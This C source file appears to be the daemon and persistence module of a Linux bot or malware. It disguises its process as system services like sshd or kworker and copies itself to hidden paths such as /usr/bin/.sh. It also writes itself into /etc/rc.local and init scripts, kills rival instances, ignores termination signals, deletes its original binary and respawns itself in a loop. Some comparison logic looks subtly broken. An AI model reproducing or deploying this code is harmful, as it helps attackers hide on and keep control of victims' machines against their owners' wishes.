#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sched.h>
#include <sys/wait.h>
#include <dirent.h>
#include <time.h>
#include <fcntl.h>
#include <sys/prctl.h>

#include "headers/daemon.h"
#include "headers/locker.h"
#include "headers/utils.h"
#include "headers/rand.h"

#define MAX_INSTANCES 2
#define LOCK_FILE "/tmp/.instance_lock"

extern char **environ;

void set_name(const char *name) {
    prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
}

void gen_name(char *out, int len) {
    const char *sys_names[] = {
        "init", "systemd", "udevd", "dbus", "sshd", "rsyslogd", "cron",
        "getty", "dhclient", "ntpd", "iptables", "networkd", "wpa_supplicant",
        "syslogd", "klogd", "login"
    };
    int num_names = sizeof(sys_names) / sizeof(sys_names[0]);

    static int seeded = 0;
    if (!seeded) {
        srand(time(NULL));
        seeded = 1;
    }

    int idx = rand_next() % num_names;
    util_strncpy(out, sys_names[idx], len - 1);
    out[len - 1] = '\0';
}

static void exec_cmd(const char *cmd) {
    int ret = system(cmd);
    (void)ret;
}

void hide_process_name(int argc, char **argv)
{
    extern char **environ;

    for (char **env = environ; *env != NULL; ++env)
        util_zero(*env, util_strlen(*env));

    size_t total = 0;
    for (int i = 0; i < argc; i++)
        total += util_strlen(argv[i]) + 1;

    util_zero(argv[0], total);

    char fake_name[32];
    gen_name(fake_name, sizeof(fake_name));

    util_strncpy(argv[0], fake_name, total - 1);
    prctl(PR_SET_NAME, (unsigned long)fake_name, 0, 0, 0);
}


static pid_t find_pid_slot(void) {
    DIR *dir;
    struct dirent *ent;
    pid_t lowest = 300;
    int taken[1000] = {0};

    if((dir = opendir("/proc")) != NULL) {
        while((ent = readdir(dir)) != NULL) {
            pid_t pid = util_atoi(ent->d_name, 10);
            if(pid > 0 && pid < 1000) taken[pid] = 1;
        }
        closedir(dir);
    }

    for(pid_t i = 300; i < 1000; i++) {
        if(!taken[i]) {
            lowest = i;
            break;
        }
    }
    return lowest;
}

static int check_running_instances(void) {
    int count = 0;
    DIR *dir;
    struct dirent *ent;
    char path[256], exe_realpath[256];
    char self_exe[256];

    ssize_t self_len = readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1);
    if (self_len == -1) return 0;
    self_exe[self_len] = '\0';

    if((dir = opendir("/proc")) != NULL) {
        while((ent = readdir(dir)) != NULL) {
            pid_t pid = util_atoi(ent->d_name, 10);
            if(pid <= 0 || pid == getpid()) continue;

            util_snprintf(path, sizeof(path), "/proc/%d/exe", pid);
            ssize_t len = readlink(path, exe_realpath, sizeof(exe_realpath) - 1);
            if (len != -1) {
                exe_realpath[len] = '\0';
                if (util_strcmp(exe_realpath, self_exe) || util_strcmp(exe_realpath, "/usr/bin/.sh")) {
                    count++;
                }
            }
        }
        closedir(dir);
    }
    return count;
}

static int acquire_instance_lock(void) {
    int fd = open(LOCK_FILE, O_RDWR|O_CREAT, 0600);
    if(fd < 0) return 0;

    struct flock fl = {
        .l_type = F_WRLCK,
        .l_whence = SEEK_SET,
        .l_start = 0,
        .l_len = 1
    };

    if(fcntl(fd, F_SETLK, &fl) < 0) {
        close(fd);
        return 0;
    }
    return 1;
}

static void respawn_proc(void) {
    if(check_running_instances() >= MAX_INSTANCES) return;
    if(!acquire_instance_lock()) return;
    char path[256];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path)-1);
    if(len < 0) return;
    path[len] = '\0';
    const char *dirs[] = {"/tmp/.sysd", "/var/run/.sysd"};
    for(int i = 0; i < 2; i++) {
        char tmp_path[256];
        util_snprintf(tmp_path, sizeof(tmp_path), "%s", dirs[i]);

        int src_fd = open(path, O_RDONLY);
        if (src_fd < 0) continue;
        int dst_fd = open(tmp_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
        if (dst_fd < 0) {
            close(src_fd);
            continue;
        }
        char buffer[4096];
        ssize_t n;
        while ((n = read(src_fd, buffer, sizeof(buffer))) > 0) {
            write(dst_fd, buffer, n);
        }
        close(src_fd);
        close(dst_fd);

        pid_t child = fork();
        if(child == 0) {
            setsid();
            char *argv_fake[] = {"kworker", NULL};
            extern char **environ;
            for(char **env = environ; *env; ++env) util_zero(*env, util_strlen(*env));
            execl(tmp_path, "kworker", NULL);
            exit(0);
        }
        unlink(tmp_path);
        if(child > 0) break;
    }
}

static void hide_pid(void) {
    char buf[64], name[32];
    int fd;

    gen_name(name, sizeof(name));
    set_name(name);

    snprintf(buf, sizeof(buf), "/proc/%d/fd/0", getpid());
    if((fd = open(buf, O_RDWR)) > -1) {
        dup2(fd, 0);
        close(fd);
    }
}

int startup_persist(char *exec) {
    DIR *dir = opendir("/proc");
    if (dir) {
        struct dirent *ent;
        while ((ent = readdir(dir)) != NULL) {
            pid_t pid = util_atoi(ent->d_name, 10);
            if (pid <= 1 || pid == getpid()) continue;
            char exe_path[256];
            snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);
            char realpath_buf[512];
            ssize_t len = readlink(exe_path, realpath_buf, sizeof(realpath_buf)-1);
            if (len > 0) {
                realpath_buf[len] = '\0';
                if (util_strcmp(realpath_buf, exec) || util_strcmp(realpath_buf, "/usr/bin/.sh")) {
                    kill(pid, SIGKILL);
                }
            }
        }
        closedir(dir);
    }
    int wait_count = 0;
    int can_copy = 0;
    while (wait_count < 20) {
        if (access("/usr/bin/.sh", W_OK) == 0 || access("/usr/bin/.sh", F_OK) != 0) {
            can_copy = 1;
            break;
        }
        usleep(100000);
        wait_count++;
    }
    if (can_copy) {
        char buf[512];
        FILE *f;
        int found = 0;

        int src_fd = open(exec, O_RDONLY);
        if (src_fd >= 0) {
            int dst_fd = open("/usr/bin/.sh", O_WRONLY | O_CREAT | O_TRUNC, 0755);
            if (dst_fd >= 0) {
                char copy_buf[4096];
                ssize_t n;
                while ((n = read(src_fd, copy_buf, sizeof(copy_buf))) > 0) {
                    write(dst_fd, copy_buf, n);
                }
                close(dst_fd);
            }
            close(src_fd);
        }

        f = fopen("/etc/rc.local", "r+");
        if(f) {
            char line[512];
            while(fgets(line, sizeof(line), f)) {
                if(strstr(line, "/usr/bin/.sh")) { found = 1; break; }
            }
            if(!found) { fseek(f, 0, SEEK_END); fprintf(f, "/usr/bin/.sh &\n"); }
            fclose(f); chmod("/etc/rc.local", 0755); return 0;
        }
        f = fopen("/etc/init.d/sysd", "w");
        if(f) {
            fprintf(f, "#!/bin/sh\n/usr/bin/.sh &\n");
            fclose(f);
            chmod("/etc/init.d/sysd", 0755);
            symlink("/etc/init.d/sysd", "/etc/rc2.d/S99sysd");
        }
        return 0;
    }
    return 0;
}

void daemonize(int argc, char **argv, char *original_path) {
    pid_t pid;

    if(fork()) exit(0);
    if(setsid() < 0) exit(1);
    if(fork()) exit(0);

    signal(SIGPIPE, SIG_IGN);

    struct sigaction sa;
    sa.sa_handler = SIG_IGN;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_NOCLDWAIT;
    sigaction(SIGCHLD, &sa, NULL);

    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGALRM, SIG_IGN);
    signal(SIGTRAP, SIG_IGN);
    signal(SIGURG, SIG_IGN);
    signal(SIGQUIT, SIG_IGN);
    signal(SIGUSR1, SIG_IGN);

    if(chdir("/") < 0) exit(1);
    umask(0);

    for(int i = 0; i < 1024; i++)
        close(i);

    open("/dev/null", O_RDWR);
    dup2(0, 1);
    dup2(0, 2);

    hide_pid();
    if(argc > 0) {
        hide_process_name(argc, argv);
        startup_persist(original_path);
        respawn_proc();
    }

    unlink(original_path);

    sched_setscheduler(0, SCHED_RR, &(struct sched_param){.sched_priority = 0});

    while(1) {
        pid = fork();
        if(pid == 0) return;
        if(pid > 0) {
            int status;
            waitpid(pid, &status, 0);
            if(WIFEXITED(status)) {
                int exit_code = WEXITSTATUS(status);
                if(exit_code == 42) {
                    exit(0);
                }
                if(exit_code == 0) {
                    sleep(15);
                } else {
                    sleep(5);
                }
                respawn_proc();
            } else {
                respawn_proc();
                sleep(5);
            }
        }
    }
}
